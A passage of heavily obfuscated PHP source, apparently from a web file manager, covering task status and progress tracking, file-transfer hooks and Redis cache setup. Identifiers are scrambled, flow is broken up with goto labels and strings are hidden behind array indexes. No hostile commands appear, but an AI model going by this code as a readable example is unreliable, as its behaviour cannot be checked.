self::get($EŒ½£²ßçÅ[$fä‰…†äß[364]]); $F†˜Ç¼Àæ… = $AªÊÏÛ©•ã[$fä‰…†äß[689]]; if ($F†˜Ç¼Àæ… == self::STATYS_KILL) { $B„Óò¸éÓ = array($fä‰…†äß[1427] => LNG($fä‰…†äß[1428]), $fä‰…†äß[1028] => !1); Cache::set($fä‰…†äß[1429] . $this->task[$fä‰…†äß[364]], $B„Óò¸éÓ, 30); $this->end(); die; } else { if ($F†˜Ç¼Àæ… == self::STATYS_STOP) { $c• „‡¹óÓ = 2; $AªÊÏÛ©•ã[$fä‰…†äß[1418]] += $c• „‡¹óÓ; self::valueSet($EŒ½£²ßçÅ[$fä‰…†äß[364]], $AªÊÏÛ©•ã); sleep($c• „‡¹óÓ); $this->update(); return; } } goto BĞ¯¡¯èˆ½; cÃ·”¶: $this->updateAfter(); $fÍÀ¸ß«Ì = 0.2; if (timeFloat() - $EŒ½£²ßçÅ[$fä‰…†äß[1417]] < $fÍÀ¸ß«Ì) { return; } goto f¶Ÿ³ŸªËÓ; C˜½ã“¸: $EŒ½£²ßçÅ[$fä‰…†äß[986]] += $C›Ô½ÔÓ±·; $EŒ½£²ßçÅ[$fä‰…†äß[1416]] = timeFloat(); if ($EŒ½£²ßçÅ[$fä‰…†äß[974]]) { if ($EŒ½£²ßçÅ[$fä‰…†äß[974]] < $EŒ½£²ßçÅ[$fä‰…†äß[986]]) { $EŒ½£²ßçÅ[$fä‰…†äß[974]] = $EŒ½£²ßçÅ[$fä‰…†äß[986]]; } $E¸İŞÁ¥¶ª = timeFloat() - $EŒ½£²ßçÅ[$fä‰…†äß[1415]] - $EŒ½£²ßçÅ[$fä‰…†äß[1418]]; $EŒ½£²ßçÅ[$fä‰…†äß[1413]] = $EŒ½£²ßçÅ[$fä‰…†äß[986]] / $EŒ½£²ßçÅ[$fä‰…†äß[974]]; $EŒ½£²ßçÅ[$fä‰…†äß[1414]] = $EŒ½£²ßçÅ[$fä‰…†äß[986]] / $E¸İŞÁ¥¶ª; if ($EŒ½£²ßçÅ[$fä‰…†äß[1413]] > 0) { $EŒ½£²ßçÅ[$fä‰…†äß[1419]] = $E¸İŞÁ¥¶ª * (1 - $EŒ½£²ßçÅ[$fä‰…†äß[1413]]) / $EŒ½£²ßçÅ[$fä‰…†äß[1413]]; } $EŒ½£²ßçÅ[$fä‰…†äß[1419]] = $EŒ½£²ßçÅ[$fä‰…†äß[1419]] <= 0 ? 0 : $EŒ½£²ßçÅ[$fä‰…†äß[1419]]; } goto cÃ·”¶; E‘¨ÓÆëí¨: $fä‰…†äß =& $_SERVER[¢à]; $EŒ½£²ßçÅ =& $this->task; if (!$EŒ½£²ßçÅ) { return; } goto C˜½ã“¸; Cê›…„ÌŞº: Hook::trigger($fä‰…†äß[1430], $EŒ½£²ßçÅ); self::valueSet($EŒ½£²ßçÅ[$fä‰…†äß[364]], $EŒ½£²ßçÅ); goto bÔøÑÕ´ÔÀ; bÔøÑÕ´ÔÀ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($D±ïæŠ¶Ñ¨) { $bŞï¡¶Å¡ =& $_SERVER[¢à]; Cache::set($bŞï¡¶Å¡[1429] . $this->task[$bŞï¡¶Å¡[364]], $D±ïæŠ¶Ñ¨, 60); return $D±ïæŠ¶Ñ¨; } public static function get($AÈùàİÍî¡) { return self::valueGet($AÈùàİÍî¡); } public static function listData() { $CÉêçÂ“¸¨ = self::valueGet(); return array_sort_by($CÉêçÂ“¸¨, $_SERVER[¢à][1415], !0); } public static function kill($aö‚¼¶äÜ¾) { return self::changeStatus($aö‚¼¶äÜ¾, self::STATYS_KILL); } public static function stop($DÉ„ Â»¦Ş) { return self::changeStatus($DÉ„ Â»¦Ş, self::STATYS_STOP); } public static function restart($CïñâÆö‡) { return self::changeStatus($CïñâÆö‡, self::STATYS_RUNNING); } public static function killAll() { $fåƒÎñµê› =& $_SERVER[¢à]; $c‘™Œ“¹õ = self::listData(); foreach ($c‘™Œ“¹õ as $aùĞ¬—Äõƒ) { self::kill($aùĞ¬—Äõƒ[$fåƒÎñµê›[364]]); } sleep(2); foreach ($c‘™Œ“¹õ as $aùĞ¬—Äõƒ) { self::valueSet($aùĞ¬—Äõƒ[$fåƒÎñµê›[364]], !1); } } private static function changeStatus($Aªà¿ÇÇ‘Ú, $Eª®—³‚ğ) { goto Aµâ¬ÍëŠ§; Då§÷—¬Ö¬: return !0; goto F©Ì¸”‡ŸÙ; Cç»áĞ‹º²: $eâš­”öË[$b¼—×ª›Æë[689]] = $Eª®—³‚ğ; self::valueSet($Aªà¿ÇÇ‘Ú, $eâš­”öË); self::log($b¼—×ª›Æë[1431] . $eâš­”öË[$b¼—×ª›Æë[364]] . $b¼—×ª›Æë[1432] . $Eª®—³‚ğ); goto Då§÷—¬Ö¬; Aµâ¬ÍëŠ§: $b¼—×ª›Æë =& $_SERVER[¢à]; $eâš­”öË = self::valueGet($Aªà¿ÇÇ‘Ú); if (!$eâš­”öË) { return !1; } goto Cç»áĞ‹º²; F©Ì¸”‡ŸÙ: } public static function valueGet($DÏš ˆ®Œå = false) { $d¹…ÏŸˆµà =& $_SERVER[¢à]; if ($DÏš ˆ®Œå) { $E­´ŸºßÚñ = Model($d¹…ÏŸˆµà[395])->where(array($d¹…ÏŸˆµà[89] => $DÏš ˆ®Œå, $d¹…ÏŸˆµà[29] => $d¹…ÏŸˆµà[1433]))->find(); return $E­´ŸºßÚñ ? json_decode($E­´ŸºßÚñ[$d¹…ÏŸˆµà[356]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($eëœ…ºõ = false) { goto AöÕˆ¨óï; AöÕˆ¨óï: $A‘ÑŒ¾æì =& $_SERVER[¢à]; $c¢…Ä§§» = array($A‘ÑŒ¾æì[29] => $A‘ÑŒ¾æì[1433]); if ($eëœ…ºõ) { $c¢…Ä§§»[$A‘ÑŒ¾æì[1412]] = $eëœ…ºõ; } goto B›¯Áî†Ùæ; BÎ½œ—Êñã: return $BïÄ“Õñô¸; goto CŒ×©ç‘¼ï; B›¯Áî†Ùæ: $BïÄ“Õñô¸ = Model($A‘ÑŒ¾æì[395])->where($c¢…Ä§§»)->select(); $BïÄ“Õñô¸ = $BïÄ“Õñô¸ ? $BïÄ“Õñô¸ : array(); foreach ($BïÄ“Õñô¸ as $e¿Ä«ªîŸİ => $bÚ°Ô°íÙ¸) { $BïÄ“Õñô¸[$e¿Ä«ªîŸİ] = json_decode($bÚ°Ô°íÙ¸[$A‘ÑŒ¾æì[356]], !0); } goto BÎ½œ—Êñã; CŒ×©ç‘¼ï: } public static function valueSet($c‚ĞŸ³», $CàèËÎâ) { goto föÆåÚÆÃ¼; bóãÉ·ÅÛ: Model($c‰º½‘ŠŞÁ[395])->add($E¼Œæœ¬¾í, array(), !0); goto A¢‘§áÒç½; d•İØ²·ô: if (!$Bô”…÷°ÊŒ) { ob_start(); var_dump($CàèËÎâ); $B’¶ÚÌğ…¿ = ob_get_clean(); self::log($c‰º½‘ŠŞÁ[1434] . json_encode_force($B’¶ÚÌğ…¿)); } if (!$c‚ĞŸ³» || !$CàèËÎâ[$c‰º½‘ŠŞÁ[364]]) { return !1; } $E¼Œæœ¬¾í = array($c‰º½‘ŠŞÁ[29] => $c‰º½‘ŠŞÁ[1433], $c‰º½‘ŠŞÁ[1412] => USER_ID, $c‰º½‘ŠŞÁ[89] => $c‚ĞŸ³», $c‰º½‘ŠŞÁ[356] => $Bô”…÷°ÊŒ); goto bóãÉ·ÅÛ; föÆåÚÆÃ¼: $c‰º½‘ŠŞÁ =& $_SERVER[¢à]; if (!$CàèËÎâ) { return Model($c‰º½‘ŠŞÁ[395])->where(array($c‰º½‘ŠŞÁ[89] => $c‚ĞŸ³», $c‰º½‘ŠŞÁ[29] => $c‰º½‘ŠŞÁ[1433]))->delete(); } $Bô”…÷°ÊŒ = json_encode($CàèËÎâ); goto d•İØ²·ô; A¢‘§áÒç½: } public static function log($AÇ¬ë§Ü¶Ó) { write_log($AÇ¬ë§Ü¶Ó, $_SERVER[¢à][1435]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto e‹ë“È; EĞÚêñÖ: Hook::bind($aÀ±¬ºéÂ[535], array($this, $aÀ±¬ºéÂ[1442])); Hook::bind($aÀ±¬ºéÂ[536], array($this, $aÀ±¬ºéÂ[1443])); Hook::bind($aÀ±¬ºéÂ[538], array($this, $aÀ±¬ºéÂ[1444])); goto C•·´Ù´Ó; bğøé²Ãß‰: Hook::bind($aÀ±¬ºéÂ[1436], array($this, $aÀ±¬ºéÂ[1437])); Hook::bind($aÀ±¬ºéÂ[1438], array($this, $aÀ±¬ºéÂ[1439])); Hook::bind($aÀ±¬ºéÂ[1440], array($this, $aÀ±¬ºéÂ[1441])); goto EĞÚêñÖ; C•·´Ù´Ó: Hook::bind($aÀ±¬ºéÂ[539], array($this, $aÀ±¬ºéÂ[1444])); Hook::bind($aÀ±¬ºéÂ[505], array($this, $aÀ±¬ºéÂ[1445])); Hook::bind($aÀ±¬ºéÂ[502], array($this, $aÀ±¬ºéÂ[1445])); goto fùÜˆŸªí; Bœ¼´‡ÊÃ: $däÎØªá˜ˆ[$aÀ±¬ºéÂ[1455]] = LNG($aÀ±¬ºéÂ[1456]); $däÎØªá˜ˆ[$aÀ±¬ºéÂ[1457]] = 0; $däÎØªá˜ˆ[$aÀ±¬ºéÂ[1458]] = 0; goto E£¢İÓÅ‹œ; e‹ë“È: $aÀ±¬ºéÂ =& $_SERVER[¢à]; $däÎØªá˜ˆ =& $this->task; $this->sourceCopyFolder = !1; goto bğøé²Ãß‰; A‘´´çñ”Î: if (!$däÎØªá˜ˆ[$aÀ±¬ºéÂ[1317]]) { $däÎØªá˜ˆ[$aÀ±¬ºéÂ[1317]] = LNG($aÀ±¬ºéÂ[1461]); } goto f»ôñÀ£î; eŞŠÛÀöƒ˜: Hook::bind($aÀ±¬ºéÂ[1446], array($this, $aÀ±¬ºéÂ[1447])); Hook::bind($aÀ±¬ºéÂ[528], array($this, $aÀ±¬ºéÂ[1448])); $this->sourceModelCopyFlag = !1; goto F¹Ã¯ĞÙÓ‘; E£¢İÓÅ‹œ: $däÎØªá˜ˆ[$aÀ±¬ºéÂ[976]] = $aÀ±¬ºéÂ[33]; $däÎØªá˜ˆ[$aÀ±¬ºéÂ[1459]] = $aÀ±¬ºéÂ[33]; $däÎØªá˜ˆ[$aÀ±¬ºéÂ[1460]] = 0; goto A‘´´çñ”Î; fùÜˆŸªí: Hook::bind($aÀ±¬ºéÂ[507], array($this, $aÀ±¬ºéÂ[1445])); Hook::bind($aÀ±¬ºéÂ[509], array($this, $aÀ±¬ºéÂ[1445])); Hook::bind($aÀ±¬ºéÂ[511], array($this, $aÀ±¬ºéÂ[1445])); goto eŞŠÛÀöƒ˜; F¹Ã¯ĞÙÓ‘: Hook::bind($aÀ±¬ºéÂ[1449], array($this, $aÀ±¬ºéÂ[1450])); Hook::bind($aÀ±¬ºéÂ[1451], array($this, $aÀ±¬ºéÂ[1452])); Hook::bind($aÀ±¬ºéÂ[1453], array($this, $aÀ±¬ºéÂ[1454])); goto Bœ¼´‡ÊÃ; f»ôñÀ£î: } protected function endAfter() { goto F«ä¢Äîˆ›; Fø¶ƒÅ: Hook::unbind($F±ÈËÃµ©â[538], array($this, $F±ÈËÃµ©â[1444])); Hook::unbind($F±ÈËÃµ©â[539], array($this, $F±ÈËÃµ©â[1444])); Hook::unbind($F±ÈËÃµ©â[505], array($this, $F±ÈËÃµ©â[1445])); goto cİì¨¹ˆ¤¢; F«ä¢Äîˆ›: $F±ÈËÃµ©â =& $_SERVER[¢à]; Hook::unbind($F±ÈËÃµ©â[1436], array($this, $F±ÈËÃµ©â[1437])); Hook::unbind($F±ÈËÃµ©â[1438], array($this, $F±ÈËÃµ©â[1439])); goto FÛËŸ°¶§‹; A½ÙâŞÏ…Õ: Hook::unbind($F±ÈËÃµ©â[1449], array($this, $F±ÈËÃµ©â[1450])); Hook::unbind($F±ÈËÃµ©â[1451], array($this, $F±ÈËÃµ©â[1452])); Hook::unbind($F±ÈËÃµ©â[1453], array($this, $F±ÈËÃµ©â[1454])); goto bŠÏªª¿æ; cİì¨¹ˆ¤¢: Hook::unbind($F±ÈËÃµ©â[502], array($this, $F±ÈËÃµ©â[1445])); Hook::unbind($F±ÈËÃµ©â[507], array($this, $F±ÈËÃµ©â[1445])); Hook::unbind($F±ÈËÃµ©â[509], array($this, $F±ÈËÃµ©â[1445])); goto C¨‰á³–Ò; FÛËŸ°¶§‹: Hook::unbind($F±ÈËÃµ©â[1440], array($this, $F±ÈËÃµ©â[1441])); Hook::unbind($F±ÈËÃµ©â[535], array($this, $F±ÈËÃµ©â[1442])); Hook::unbind($F±ÈËÃµ©â[536], array($this, $F±ÈËÃµ©â[1443])); goto Fø¶ƒÅ; C¨‰á³–Ò: Hook::unbind($F±ÈËÃµ©â[511], array($this, $F±ÈËÃµ©â[1445])); Hook::unbind($F±ÈËÃµ©â[1446], array($this, $F±ÈËÃµ©â[1447])); Hook::unbind($F±ÈËÃµ©â[528], array($this, $F±ÈËÃµ©â[1448])); goto A½ÙâŞÏ…Õ; bŠÏªª¿æ: } public function copyMoveStart($fèóõ‰¥ÑÇ, $b¨ñ¿ô®ˆ¬, $Cƒ×ª”¯‘Ê, $e¿˜‰ºÆÑÒ) { } public function updateAfter() { goto DŞ¢¥ŒÇÏÔ; B…ƒ…ä¤…Õ: if ($this->sourceModelCopyFlag) { return; } $eößìŠ“Œï = 0; if ($EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1459]] == $E©ÌÂŠÍ¯[1036]) { $eößìŠ“Œï = $EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1458]] * 0.5; } else { if ($EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1459]] == $E©ÌÂŠÍ¯[91]) { $eößìŠ“Œï = $EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1458]] * 0.5 + $EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1457]] * 0.5; } } goto C™‚ÓãÌáÛ; C™‚ÓãÌáÛ: $EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1413]] = ($EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1462]] + $eößìŠ“Œï) / $EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[698]]; if ($EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1413]] > 0) { $B¸ø†ªÜ¾ = timeFloat() - $EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1415]] - $EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1418]]; $EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1419]] = $B¸ø†ªÜ¾ * (1 - $EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1413]]) / $EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[1413]]; } goto a‡¡ËÊ¿; DŞ¢¥ŒÇÏÔ: $E©ÌÂŠÍ¯ =& $_SERVER[¢à]; $EÜàììÚ«ƒ =& $this->task; if (!$EÜàììÚ«ƒ[$E©ÌÂŠÍ¯[698]]) { return; } goto B…ƒ…ä¤…Õ; a‡¡ËÊ¿: } public function addPath($A’Û–è­É×) { goto EŠÓËÎ¡®¤; BºÜ‹„Š“§: $bğöíù˜Ò = IO::infoWithChildren($A’Û–è­É×); $DŞ¢”ÎÆ = $D¯ÉÇÌ×÷š[$C—±»‰ƒõ½[1463]] ? $D¯ÉÇÌ×÷š[$C—±»‰ƒõ½[1463]][$C—±»‰ƒõ½[1464]] : 0; $D¯ÉÇÌ×÷š[$C—±»‰ƒõ½[1463]] = array($C—±»‰ƒõ½[1464] => $DŞ¢”ÎÆ + 1, $C—±»‰ƒõ½[383] => $bğöíù˜Ò[$C—±»‰ƒõ½[28]], $C—±»‰ƒõ½[75] => $bğöíù˜Ò[$C—±»‰ƒõ½[75]], $C—±»‰ƒõ½[462] => $bğöíù˜Ò[$C—±»‰ƒõ½[462]] ? $bğöíù˜Ò[$C—±»‰ƒõ½[462]] : $bğöíù˜Ò[$C—±»‰ƒõ½[75]]); goto díò„•ˆ; EŠÓËÎ¡®¤: $C—±»‰ƒõ½ =& $_SERVER[¢à]; if (!$A’Û–è­É×) { return; } $D¯ÉÇÌ×÷š =& $this->task; goto BºÜ‹„Š“§; díò„•ˆ: if ($bğöíù˜Ò[$C—±»‰ƒõ½[29]] == $C—±»‰ƒõ½[164]) { $D¯ÉÇÌ×÷š[$C—±»‰ƒõ½[974]] += 1; } else { $D¯ÉÇÌ×÷š[$C—±»‰ƒõ½[974]] += $bğöíù˜Ò[$C—±»‰ƒõ½[80]][$C—±»‰ƒõ½[78]]; if ($bğöíù˜Ò[$C—±»‰ƒõ½[366]]) { $D¯ÉÇÌ×÷š[$C—±»‰ƒõ½[974]] += $bğöíù˜Ò[$C—±»‰ƒõ½[80]][$C—±»‰ƒõ½[79]] + 1; } } $D¯ÉÇÌ×÷š[$C—±»‰ƒõ½[698]] += $bğöíù˜Ò[$C—±»‰ƒõ½[77]]; $this->update(); goto cóäŠÀ«Ñõ; cóäŠÀ«Ñõ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($c£â…Äê“) { $e’¦ò”’«Û =& $_SERVER[¢à]; $aëÓÎ§±± =& $this->task; $aëÓÎ§±±[$e’¦ò”’«Û[1455]] = $c£â…Äê“[$e’¦ò”’«Û[28]]; $aëÓÎ§±±[$e’¦ò”’«Û[976]] = $c£â…Äê“[$e’¦ò”’«Û[28]]; $this->update(); } public function copyFileStart($C¼«¡éºğØ, $EíÎ¹ïª¸, $F¾®ÊŒ¹Ü, $aÃã…Á®áŠ, $cê¬æÏ¥±”, $A×Ò¼¿²İ) { goto Dùƒ©˜; a–÷Š¥¸†¥: $this->update(); goto b’²œí¥Î; Dùƒ©˜: $E’…‰Ê£‘ =& $_SERVER[¢à]; $dñ½‰ÍêšÔ = $cê¬æÏ¥±”; if ($dñ½‰ÍêšÔ == $GLOBALS[$E’…‰Ê£‘[1465]]) { $dñ½‰ÍêšÔ = $GLOBALS[$E’…‰Ê£‘[1466]]; } goto bÂ£¦ø°ƒ¡; f¡„Û¾ ó²: $a‹æÚ[$E’…‰Ê£‘[976]] = $E’…‰Ê£‘[33]; $a‹æÚ[$E’…‰Ê£‘[1459]] = $E’…‰Ê£‘[33]; $a‹æÚ[$E’…‰Ê£‘[1460]] = 0; goto a–÷Š¥¸†¥; bß±”¨Ö°È: $a‹æÚ[$E’…‰Ê£‘[1455]] = $dñ½‰ÍêšÔ; $a‹æÚ[$E’…‰Ê£‘[1457]] = (int) $C¼«¡éºğØ->size($EíÎ¹ïª¸); $a‹æÚ[$E’…‰Ê£‘[1458]] = 0; goto f¡„Û¾ ó²; bÂ£¦ø°ƒ¡: $GLOBALS[$E’…‰Ê£‘[1466]] = $cê¬æÏ¥±”; $GLOBALS[$E’…‰Ê£‘[1465]] = $A×Ò¼¿²İ; $a‹æÚ =& $this->task; goto bß±”¨Ö°È; b’²œí¥Î: } public function copyFileEnd($B‚Üë•¦‹, $Fíôä‘ÜÑ, $d¬¥ •ÔÂ, $aõ®ãÅêòŒ, $a÷³„À¼‡”, $B÷ô¶çÜÅ¾) { $DÜ¥–´âÕ‚ =& $_SERVER[¢à]; $B«ñ§÷Œ…Ë =& $this->task; $B«ñ§÷Œ…Ë[$DÜ¥–´âÕ‚[1458]] = $B«ñ§÷Œ…Ë[$DÜ¥–´âÕ‚[1457]]; $B«ñ§÷Œ…Ë[$DÜ¥–´âÕ‚[1459]] = $DÜ¥–´âÕ‚[33]; if ($a÷³„À¼‡” == $B«ñ§÷Œ…Ë[$DÜ¥–´âÕ‚[1455]]) { $B«ñ§÷Œ…Ë[$DÜ¥–´âÕ‚[1462]] += $B«ñ§÷Œ…Ë[$DÜ¥–´âÕ‚[1457]]; $this->update(1); } else { $this->update(); $B«ñ§÷Œ…Ë[$DÜ¥–´âÕ‚[1458]] = 0; } self::log($DÜ¥–´âÕ‚[1467] . $Fíôä‘ÜÑ . $DÜ¥–´âÕ‚[66] . $aõ®ãÅêòŒ . $DÜ¥–´âÕ‚[214] . $a÷³„À¼‡” . $DÜ¥–´âÕ‚[1468] . $B«ñ§÷Œ…Ë[$DÜ¥–´âÕ‚[1455]]); } public function updateFileEnd($C§â“òÒãŞ, $aÜˆÎ´ÖÛ±) { $F¤–¡ÄíÆ =& $_SERVER[¢à]; $e…°î„…À =& $this->task; $e…°î„…À[$F¤–¡ÄíÆ[1455]] = $C§â“òÒãŞ; $e…°î„…À[$F¤–¡ÄíÆ[1457]] = $aÜˆÎ´ÖÛ±; $e…°î„…À[$F¤–¡ÄíÆ[1462]] += $aÜˆÎ´ÖÛ±; $this->update(1); } public function sourceModelCopy($C£®Àİ×Ó¯) { goto a”Ó—ƒ†‘¨; a”Ó—ƒ†‘¨: $a¼¬±òÚ‡ =& $_SERVER[¢à]; $a«º«Óèä = $C£®Àİ×Ó¯[0]; $BÓºÇéé’µ = $C£®Àİ×Ó¯[1]; goto a¼íÑˆ; D¡Ï¾õ„¬: switch ($a«º«Óèä) { case $a¼¬±òÚ‡[503]: $d Ş—ƒ­¿Ê = 1; break; case $a¼¬±òÚ‡[506]: $D¶ˆîÖÈèÄ[$a¼¬±òÚ‡[1455]] = $BÓºÇéé’µ[$a¼¬±òÚ‡[28]]; break; case $a¼¬±òÚ‡[508]: $d Ş—ƒ­¿Ê = intval($C£®Àİ×Ó¯[$a¼¬±òÚ‡[360]] * 0.4); break; case $a¼¬±òÚ‡[510]: $d Ş—ƒ­¿Ê = intval($C£®Àİ×Ó¯[$a¼¬±òÚ‡[360]] * 0.2); break; case $a¼¬±òÚ‡[512]: $d Ş—ƒ­¿Ê = intval($C£®Àİ×Ó¯[$a¼¬±òÚ‡[360]] * 0.4); break; } $this->update($d Ş—ƒ­¿Ê); $this->sourceModelCopyFlag = !1; goto Dåß›ïöéõ; a¼íÑˆ: $D¶ˆîÖÈèÄ =& $this->task; $this->sourceModelCopyFlag = !0; $d Ş—ƒ­¿Ê = 0; goto D¡Ï¾õ„¬; Dåß›ïöéõ: } public function sourceRemove($e„Í•„ˆĞ’, $cÑßØÔÖÈ) { $e™Î‰ÌÓï‡ =& $_SERVER[¢à]; $this->sourceModelCopyFlag = !0; $a÷’ä«Ôø± = 1; if (isset($e„Í•„ˆĞ’[$e™Î‰ÌÓï‡[80]])) { $a÷’ä«Ôø± = $e„Í•„ˆĞ’[$e™Î‰ÌÓï‡[80]][$e™Î‰ÌÓï‡[78]] + $e„Í•„ˆĞ’[$e™Î‰ÌÓï‡[80]][$e™Î‰ÌÓï‡[79]] + 1; } $this->update($a÷’ä«Ôø±); $this->sourceModelCopyFlag = !1; } public function sourceMove($D«ñœõ´ÖŒ) { $this->sourceRemove($D«ñœõ´ÖŒ, !1); } public function curlProgress($Fª ó´ù£õ, $C˜ËêÍµÑÅ, $a–™í™“ó, $bˆø÷·Ã, $DÅÅ®İóæ) { $EŒÉè…ô½Û =& $_SERVER[¢à]; $f‡…ôî†¼Ö =& $this->task; if ($DÅÅ®İóæ > 0) { $f‡…ôî†¼Ö[$EŒÉè…ô½Û[976]] = $EŒÉè…ô½Û[1469]; $f‡…ôî†¼Ö[$EŒÉè…ô½Û[1459]] = $EŒÉè…ô½Û[91]; if ($f‡…ôî†¼Ö[$EŒÉè…ô½Û[1457]] == $bˆø÷·Ã || $bˆø÷·Ã > 1024 * 1024) { $f‡…ôî†¼Ö[$EŒÉè…ô½Û[1458]] = $DÅÅ®İóæ; } if ($f‡…ôî†¼Ö[$EŒÉè…ô½Û[1460]]) { $f‡…ôî†¼Ö[$EŒÉè…ô½Û[1458]] = $DÅÅ®İóæ + $f‡…ôî†¼Ö[$EŒÉè…ô½Û[1460]]; } } else { if ($a–™í™“ó > 0) { if ($f‡…ôî†¼Ö[$EŒÉè…ô½Û[1457]] == $C˜ËêÍµÑÅ) { $f‡…ôî†¼Ö[$EŒÉè…ô½Û[1458]] = $a–™í™“ó; $f‡…ôî†¼Ö[$EŒÉè…ô½Û[976]] = $EŒÉè…ô½Û[1470]; $f‡…ôî†¼Ö[$EŒÉè…ô½Û[1459]] = $EŒÉè…ô½Û[1036]; } } } $this->update(); } public function curlProgressStart($aŒÌ±˜ÀÀÒ) { } public function curlProgressEnd($DÈ­˜Ç­ëö) { $a˜ğÂåö…Ö =& $_SERVER[¢à]; $c¬Ê±–ˆ™ =& $this->task; $B‘Ÿ¡Õñø¶ = curl_getinfo($DÈ­˜Ç­ëö); $Dß˜†Œñ = $B‘Ÿ¡Õñø¶[$a˜ğÂåö…Ö[1471]]; if ($c¬Ê±–ˆ™[$a˜ğÂåö…Ö[1459]] == $a˜ğÂåö…Ö[91] && $Dß˜†Œñ) { $c¬Ê±–ˆ™[$a˜ğÂåö…Ö[1460]] += $Dß˜†Œñ; } $this->update(); } } goto f‚œ¡¯Š; F¿ù‚ôªµ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($b°”Ë»¸­Ë, $Dù¼›İ°‚ğ) { $D£ËÄ‡ÜÂ‹ =& $_SERVER[¢à]; if (!class_exists($D£ËÄ‡ÜÂ‹[779])) { show_json($D£ËÄ‡ÜÂ‹[780], !1); } $this->cacheTime = $Dù¼›İ°‚ğ; $AÒÊˆä”Î‹ = isset($b°”Ë»¸­Ë[$D£ËÄ‡ÜÂ‹[781]]) ? $b°”Ë»¸­Ë[$D£ËÄ‡ÜÂ‹[781]] : 10; $Då©º´ƒ“Ï = _get($b°”Ë»¸­Ë, $D£ËÄ‡ÜÂ‹[778]); if ($Då©º´ƒ“Ï && is_array($Då©º´ƒ“Ï)) { $this->isCluster = !0; $this->initCluster($b°”Ë»¸­Ë, $AÒÊˆä”Î‹); } else { $this->handle = $this->init($b°”Ë»¸­Ë, $AÒÊˆä”Î‹); } } private function init($c‡·‰ğÌö¬, $AùÑò‰¨) { $aÔ©³—ÇÃÙ =& $_SERVER[¢à]; $Bµ‰´¼é’’ = new Redis(); $DÇÜö»«ê = isset($c‡·‰ğÌö¬[$aÔ©³—ÇÃÙ[782]]) ? $c‡·‰ğÌö¬[$aÔ©³—ÇÃÙ[782]] : !1; if ($DÇÜö»«ê) { $Bµ‰´¼é’’->pconnect($c‡·‰ğÌö¬[$aÔ©³—ÇÃÙ[166]], $c‡·‰ğÌö¬[$aÔ©³—ÇÃÙ[167]], $AùÑò‰¨); } else { $Bµ‰´¼é’’->connect($c‡·‰ğÌö¬[$aÔ©³—ÇÃÙ[166]], $c‡·‰ğÌö¬[$aÔ©³—ÇÃÙ[167]], $AùÑò‰¨); } if (!empty($c‡·‰ğÌö¬[$aÔ©³—ÇÃÙ[373]])) { $Bµ‰´¼é’’->auth($c‡·‰ğÌö¬[$aÔ©³—ÇÃÙ[373]]); } return $Bµ‰´¼é’’; } private function initCluster($b¶¹º‹»Í, $C™à¤¶‰ï£) { $Cø‘ÑÂÃ˜ø =& $_SERVER[¢à]; $cñ¯¦÷ = array($Cø‘ÑÂÃ˜ø[783], $Cø‘ÑÂÃ˜ø[784], $Cø‘ÑÂÃ˜ø[785]); $eçä˜‹™×Ù = $Cø‘ÑÂÃ˜ø[783]; if (isset($b¶¹º‹»Í[$Cø‘ÑÂÃ˜ø[12]]) && in_array($b¶¹º‹»Í[$Cø‘ÑÂÃ˜ø[12]], $cñ¯¦÷)) { $eçä˜‹™×Ù = $b¶¹º‹»Í[$Cø‘ÑÂÃ˜ø[12]]; } switch ($eçä˜‹™×Ù) { case $Cø‘ÑÂÃ˜ø[783]: $this->_slave($b¶¹º‹»Í, $C™à¤¶‰ï£); break; case $Cø‘ÑÂÃ˜ø[784]: break; case $Cø‘ÑÂÃ˜ø[785]: $d¡•£¾ãÊ¶ = $b¶¹º‹»Í[$Cø‘ÑÂÃ˜ø[778]]; $Aå«ª…Õ¥ = isset($b¶¹º‹»Í[$Cø‘ÑÂÃ˜ø[782]]) ? $b¶¹º‹»Í[$Cø‘ÑÂÃ˜ø[782]] : !1; $f¦´ñëº²× = isset($b¶¹º‹»Í[$Cø‘ÑÂÃ˜ø[373]]) ? $b¶¹º‹»Í[$Cø‘ÑÂÃ˜ø[373]] : null; $this->handle = new RedisCluster(NUll, $d¡•£¾ãÊ¶, $C™à¤¶‰ï£, $C™à¤¶‰ï£, $Aå«ª…Õ¥, $f¦´ñëº²×); break; default: break; } } private function _slave($BÕòÕ±²¬, $b’›Ñ‰¢«) { goto cÍÍáğ®ƒ®; C‚‹â¸Éõ¦: $this->filterConfig($BÕòÕ±²¬, $E ÌÈ„—ğ[$Eˆí­‹Ñ Ä]); $this->slaveHandle = $this->init($BÕòÕ±²¬, $b’›Ñ‰¢«); goto EĞªö¤Ş¼è; cÍÍáğ®ƒ®: $E ÌÈ„—ğ = $BÕòÕ±²¬[$_SERVER[¢à][778]]; $this->filterConfig($BÕòÕ±²¬, $E ÌÈ„—ğ[0]); $this->handle = $this->init($BÕòÕ±²¬, $b’›Ñ‰¢«); goto e†Ã±Çêî†; e†Ã±Çêî†: unset($E ÌÈ„—ğ[0]); if (empty($E ÌÈ„—ğ)) { return; } $Eˆí­‹Ñ Ä = array_rand($E ÌÈ„—ğ); goto C‚‹â¸Éõ¦; EĞªö¤Ş¼è: } private function filterConfig(&$eÒ’æŞù, $fµ ¡ó˜) { $fãŒ–Îˆå¥ =& $_SERVER[¢à]; $e­Ú‡±ªóŠ = explode($fãŒ–Îˆå¥[4], $fµ ¡ó˜); $C‚Š¶Ïµ·» = array($fãŒ–Îˆå¥[166] => 